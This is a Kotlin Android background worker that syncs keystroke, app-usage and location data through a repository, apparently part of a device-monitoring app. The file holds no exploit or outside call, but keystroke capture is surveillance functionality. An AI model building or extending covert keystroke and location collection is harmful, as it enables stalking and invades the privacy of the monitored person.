package com.github.muneebwanee.dash.workers  
  
import android.content.Context  
import androidx.hilt.work.HiltWorker  
import androidx.work.CoroutineWorker  
import androidx.work.WorkerParameters  
import com.github.muneebwanee.dash.data.repository.DataRepository  
import dagger.assisted.Assisted  
import dagger.assisted.AssistedInject  
import timber.log.Timber  
  
@HiltWorker  
class DataSyncWorker @AssistedInject constructor(  
    @Assisted context: Context,  
    @Assisted workerParams: WorkerParameters,  
    private val dataRepository: DataRepository  
) : CoroutineWorker(context, workerParams) {  
  
    override suspend fun doWork(): Result {  
        return try {  
            val dataType = inputData.getString("data_type") ?: return Result.failure()  
            val data = inputData.getString("data") ?: return Result.failure()  
            val timestamp = inputData.getLong("timestamp", System.currentTimeMillis())  
  
            when (dataType) {  
                "keystroke" -> {  
                    dataRepository.syncKeystrokeData(data, timestamp)  
                }  
                "app_usage" -> {  
                    dataRepository.syncAppUsageData(data, timestamp)  
                }  
                "location" -> {  
                    dataRepository.syncLocationData(data, timestamp)  
                }  
            }  
  
            Timber.d("Data sync completed for type: $dataType")  
            Result.success()  
        } catch (e: Exception) {  
            Timber.e(e, "Data sync failed")  
            Result.retry()  
        }  
    }  
}
